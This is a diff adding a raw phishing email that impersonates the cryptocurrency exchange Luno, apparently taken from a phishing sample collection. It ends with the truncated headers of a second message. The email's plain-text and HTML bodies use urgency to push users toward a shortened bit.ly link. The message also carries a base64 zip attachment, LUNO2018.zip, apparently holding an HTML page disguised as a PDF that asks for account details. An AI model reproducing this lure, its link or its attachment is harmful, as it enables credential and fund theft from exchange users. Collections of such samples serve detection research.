@@ -1,0 +1,282 @@
+From: LUNO <NO-REPLY@luno.com>
+To: 
+Subject: Luno Security Update
+Reply-to: NO-REPLY@lunowallet.com
+User-Agent: Horde Application Framework 5
+Content-Type: multipart/mixed; boundary="=_9iVwO2_o-iOEjqMxZfC20ta"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
+X-AuthUser: dawn@desdawn.co.za
+X-Originating-IP: 197.96.172.121
+X-SpamExperts-Domain: cp2.isignite.co.za
+X-SpamExperts-Username: 
+Authentication-Results: tld-mx.com; auth=pass (login) smtp.auth=@cp2.isignite.co.za
+X-SpamExperts-Outgoing-Class: unsure
+X-SpamExperts-Outgoing-Evidence: Combined (0.76)
+X-Recommended-Action: accept
+X-Filter-ID: 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
+ dGGNoqhmW5WUUrS3WDNmyP62L0NIm4zFGQ0jCR0=
+X-Report-Abuse-To: spam@se-filter01.tld-mx.com
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 437
+
+This message is in MIME format.
+
+--=_9iVwO2_o-iOEjqMxZfC20ta
+Content-Type: multipart/alternative; boundary="=_txirpe-ZSFxa6yW0-jhQyG_"
+Content-Transfer-Encoding: 8bit
+
+This message is in MIME format.
+
+--=_txirpe-ZSFxa6yW0-jhQyG_
+Content-Type: text/plain; charset=utf-8; format=flowed; DelSp=Yes
+Content-Description: Plaintext Message
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+
+
+   　                                           
+ 
+   　                                       
+                                           Urgent
+Attention   Luno User[1]
+ 
+    
+Your account requires immediate security upgrade. We have mandated all user
+to automatically upgrade manually by downloading the attached NEW LUNO
+account security and Mal-Ware/Fire-Wall Upgrade File and submit all details
+required for your LUNO account NEW SECURITY and Mal-Ware/Fire-Wall
+UPGRADE[1]
+
+.
+Upgrade Luno Account Now[1]
+ 
+Please keep in mind that Level 2 has the following limits:
+
+
+   *            Download attached Luno security upgrade file[1].
+   *            Submit all valid requested details.
+Please upgrade your lung account by downloading the security upgrade form
+and submit the requested details as this will cause your account to be
+locked until you provide further documentation.
+Regards,
+Team Luno[1]
+Questions? Visit the Help Centre[1]
+   　
+     	          
+   You received this email because an account was registered for Luno[1]
+     	           	          
+   　
+     	           	           	          
+
+ 
+ 
+
+ 
+
+      
+
+
+
+Links:
+------
+[1] http://bit.ly/2F3fAF4
+
+--=_txirpe-ZSFxa6yW0-jhQyG_
+Content-Type: text/html; charset=utf-8
+Content-Description: HTML Message
+Content-Disposition: inline
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"
+"http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<title></title>
+</head>
+<body style="font-family:Arial;font-size:14px">
+<div>
+<div>
+<div style="color: rgb(34, 34, 34); background-color: rgb(255, 255, 255);">
+<div>
+<div dir="ltr"><br>
+<table border="1" cellpadding="0" cellspacing="0" style="width: 583px;" width="583">
+<tbody>
+<tr>
+<td colspan="4" style="font-family: arial, sans-serif; margin: 0px;">&#12288;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img alt="Luno logo" height="39" src="https://ci5.googleusercontent.com/proxy/CLVeYeQAx1mqcOytiBkMljixCYn_e_MQ-hci4J4L8qufOv9eTUDVszB3lJ2DtsuGzfn3yCxZt3YegXHrbQI_EJQ5H_M2H2wqlDYrMfbUJ0kWWPfkGZVb7T1Hy51ZWSe3-kloAP313NUuxcpplCXQyUlMAzA0LPclVS--7rs=s0-d-e1-ft#https://gallery.mailchimp.com/4a2db6801add2161b997553ab/images/0a27a68d-8db2-4978-a664-70153f1eaa41.png" style="border: 0px; vertical-align: bottom;" width="175"><br>
+&nbsp;</td>
+</tr>
+<tr>
+<td colspan="4" style="font-family: arial, sans-serif; margin: 0px;">&#12288;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Urgent Attention&nbsp;&nbsp;&nbsp;<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">Luno&nbsp;User</a><br>
+&nbsp;</td>
+</tr>
+<tr>
+<td colspan="4" style="font-family: arial, sans-serif; margin: 0px;">&nbsp;<br>
+Your account requires immediate security upgrade. We have mandated all user to automatically upgrade manually by downloading the&nbsp;<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">attached NEW LUNO account security and Mal-Ware/Fire-Wall Upgrade File and submit all details required for your LUNO account NEW SECURITY and Mal-Ware/Fire-Wall UPGRADE</a><br>
+<br>
+.<br>
+<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">Upgrade Luno Account Now</a><br>
+&nbsp;<br>
+Please keep in mind that Level 2 has the following limits:<br>
+<ul>
+<li>Download attached&nbsp;<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">Luno&nbsp;security upgrade file</a>.</li>
+<li>Submit all valid requested details.</li>
+</ul>
+Please upgrade your lung account by downloading the security upgrade form and submit the requested details as this will cause your account to be locked until you provide further documentation.<br>
+Regards,<br>
+<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">Team&nbsp;Luno</a><br>
+Questions?&nbsp;<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">Visit the Help Centre</a></td>
+</tr>
+<tr>
+<td colspan="4" style="font-family: arial, sans-serif; margin: 0px;">&#12288;</td>
+</tr>
+<tr>
+<td colspan="2" style="font-family: arial, sans-serif; margin: 0px; width: 374px;">&nbsp;</td>
+<td colspan="2" style="font-family: arial, sans-serif; margin: 0px; width: 175px;">&nbsp;</td>
+</tr>
+<tr>
+<td colspan="4" style="font-family: arial, sans-serif; margin: 0px;">You received this email because an account was registered for&nbsp;<a data-saferedirectreason="5" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=http://bit.ly/2F3fAF4&amp;source=gmail&amp;ust=1519942957273000&amp;usg=AFQjCNER47AHKyg69eWm7J5bQhvj5YmDeA" href="http://bit.ly/2F3fAF4" style="color: rgb(17, 85, 204);" target="_blank">Luno</a></td>
+</tr>
+<tr>
+<td style="font-family: arial, sans-serif; margin: 0px; width: 182px;">&nbsp;</td>
+<td colspan="2" style="font-family: arial, sans-serif; margin: 0px; width: 268px;">&nbsp;</td>
+<td style="font-family: arial, sans-serif; margin: 0px; width: 83px;">&nbsp;</td>
+</tr>
+<tr>
+<td colspan="4" style="font-family: arial, sans-serif; margin: 0px;">&#12288;</td>
+</tr>
+<tr>
+<td style="font-family: arial, sans-serif; margin: 0px;">&nbsp;</td>
+<td style="font-family: arial, sans-serif; margin: 0px;">&nbsp;</td>
+<td style="font-family: arial, sans-serif; margin: 0px;">&nbsp;</td>
+<td style="font-family: arial, sans-serif; margin: 0px;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+&nbsp;<br>
+&nbsp;<br>
+<br>
+&nbsp;</div>
+</div>
+<p>&nbsp;</p>
+</div>
+</div>
+</div>
+</body>
+</html>
+--=_txirpe-ZSFxa6yW0-jhQyG_--
+
+--=_9iVwO2_o-iOEjqMxZfC20ta
+Content-Type: application/zip; name=LUNO2018.zip
+Content-Disposition: attachment; size=1566; filename=LUNO2018.zip
+Content-Transfer-Encoding: base64
+
+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
+Lmh0bWxQSwUGAAAAAAEAAQA9AAAAywUAAAAA
+--=_9iVwO2_o-iOEjqMxZfC20ta--
+
+
+From jose@monkey.org Thu Mar  1 14:56:36 2018 +0000
+Return-Path: prvs=1598336f04=jjwoods@gov.bm
+Delivered-To: jose@monkey.org
+X-FDA: 73894441992.14.drum95_1c7a292faf25e
+X-Spam-Summary: 50,0,0,5d126dd8e6a1b193,d41d8cd98f00b204,prvs=1598336f04=jjwoods@gov.bm,,RULES_HIT:1:2:10:41:72:355:379:582:599:960:962:967:973:983:988:989:1021:1029:1152:1189:1208:1221:1260:1261:1263:1313:1314:1345:1381:1431:1436:1437:1516:1517:1518:1575:1588:1589:1592:1594:1691:1730:1776:1792:2194:2199:2525:2526:2527:2528:2561:2564:2610:2682:2685:2693:2859:2890:2892:2902:2915:2917:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3352:3865:3866:3867:3868:3870:3871:3872:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4052:4250:4321:4379:4552:5007:6117:6248:6261:6658:6659:6678:7688:7903:8531:8583:8603:8957:9025:9080:9082:9149:9163:9165:9388:9868:10004:10026:10049:10128:10346:10919:11473:11656:11658:11875:11914:12043:12438:12519:12551:12555:12657:12661:12683:12895:12903:12986:13005:13006:13013:13014:13015:13016:13017:13018:13019:13139:13163:13229:13237:13439:13893:14096:14659:21080:21326:21364:21433:21450:21451:21483:21499:21605:21627:21740:30001:30003:
+X-HE-Tag: drum95_1c7a292faf25e
+X-Filterd-Recvd-Size: 14073
+Received: from mail.gov.bm (mail.gov.bm [207.228.133.25])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu,  1 Mar 2018 14:56:35 +0000 (UTC)
+Received: from CPSR-CAS-ITO111.gov.bm 
+    (cpsr-cas-ito111.gov.bm [10.129.82.111] (may be forged)) by 
+    mail.gov.bm (8.14.7/8.14.7) with ESMTP id w21ECDx9017723; Thu, 1 Mar 
+    2018 10:12:13 -0400
+Received: from CPSR-MBX-ITO112.gov.bm ([fe80::8db5:6de0:c2ad:52f4]) by 
+    CPSR-CAS-ITO111.gov.bm ([::1]) with mapi id 14.03.0361.001; Thu, 1 
+    Mar 2018 10:12:13 -0400
